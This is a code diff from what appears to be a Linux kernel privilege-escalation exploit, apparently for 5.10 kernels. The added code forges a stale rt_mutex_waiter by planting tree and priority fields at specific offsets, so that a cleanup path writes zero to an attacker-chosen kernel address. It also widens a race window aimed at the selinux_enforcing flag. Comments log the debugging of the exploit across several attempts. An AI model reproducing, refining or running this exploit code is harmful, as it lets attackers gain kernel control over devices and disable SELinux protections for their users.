@@ -16,7 +16,6 @@ using namespace ghostlock;
 
 namespace ghostlock::route {
     route::RouteStatus do_kernel5_fake_lock_route(const memory::WriteRequest *request) {
-        (void) request;
         route::RouteStatus status = {.code = ROUTE_RETRYABLE};
         profile::MulticastWaiterLayout layout =
                 session::g_exploit_session.profile.multicast_layout();
@@ -52,6 +51,40 @@ namespace ghostlock::route {
                        static_cast<size_t>(*layout.lock_offset), stamp_size);
             return status;
         }
+        /* E3 (hypothesis B fix): populate tree_entry and pi_tree_entry in the
+         * stale waiter so rb_erase deterministically writes *(target)=0 during
+         * the EDEADLK cleanup path.  pi_tree_entry is at +0x18 on 5.10 (no
+         * wake_state/ww_ctx), +0x28 on 6.x.  Use 0x18 for this 5.10 kernel. */
+        if (request && request->target) {
+            constexpr size_t kPiTreeOff_5_10 = 0x18;
+            if (!memory::encode_multicast_waiter_trees(
+                    {reinterpret_cast<std::byte *>(stamp), stamp_size},
+                    static_cast<size_t>(*layout.waiter_offset),
+                    kPiTreeOff_5_10, request->target)) {
+                pr_warning("E3: tree field injection failed\n");
+            } else {
+                pr_info("E3: tree fields planted for target=0x%llx\n",
+                        (unsigned long long)request->target);
+            }
+        }
+        /* E6a (prio gate): flat 5.10 rt_mutex_waiter carries prio alone at
+         * +0x40 (no wake_state word).  E3 filled the tree fields and task/lock
+         * but left prio=0, so the waiter-vs-task prio comparisons and the
+         * erase gate never passed: every E3/E4/E5 run returned route-clean
+         * with no write.  Upstream PR #721 stamps this same word for its
+         * select_stack route (waiter_prio_off = 0x40). */
+        if (request && request->target) {
+            const size_t prio_off = static_cast<size_t>(*layout.waiter_offset) + 0x40;
+            const uint32_t prio = static_cast<uint32_t>(kernel::FAKE_WAITER_PRIO);
+            if (prio_off + sizeof(prio) <= stamp_size) {
+                memcpy(stamp + prio_off, &prio, sizeof(prio));
+                pr_info("E6a: stale waiter prio=%u planted at stamp+0x%zx\n",
+                        prio, prio_off);
+            } else {
+                pr_warning("E6a: prio word outside stamp (off=0x%zx size=%zu)\n",
+                           prio_off, stamp_size);
+            }
+        }
         /* Stamp delivery (katyusha / 5.10 MP6): the IPv4 msfilter copy window
          * on this kernel cannot reach the waiter (kernel copies max 0x108 at
          * stack depth 864; waiter task/lock need 480 bytes from the window
@@ -78,6 +111,29 @@ namespace ghostlock::route {
         session::g_exploit_session.race.consumer_go.store(1);
         for (int32_t spin = 0; spin < 100000000 &&
                            session::g_exploit_session.race.consumer_calls.load() == 0; spin++)
+            __asm__ volatile (
+
+
+        "yield"
+        ::: "memory");
+        /* E1/E2 (hypothesis A): keep the window armed until the consumer has
+         * spent its full call budget. Closing right after the first call made
+         * select_consumer_max_calls a no-op on this route and left the PI walk
+         * a single racing attempt. The extended budget applies only to the W1
+         * request (its consumer stops itself the moment the enforce flag
+         * flips); every other window keeps the proven one-call behaviour. */
+        const bool e1_selinux_write =
+                session::g_exploit_session.race.request &&
+                session::g_exploit_session.race.request->target ==
+                    session::g_exploit_session.addresses.data_alias(
+                        ghostlock::profile::selinux_enforcing());
+        const uint32_t e1_budget = e1_selinux_write
+                ? session::g_exploit_session.profile.select_consumer_max_calls()
+                : 1;
+        for (int32_t spin = 0; spin < 100000000 &&
+                           (session::g_exploit_session.race.consumer_go.load() != 0 &&
+                            session::g_exploit_session.race.consumer_calls.load() < e1_budget);
+             spin++)
             __asm__ volatile (
 
 
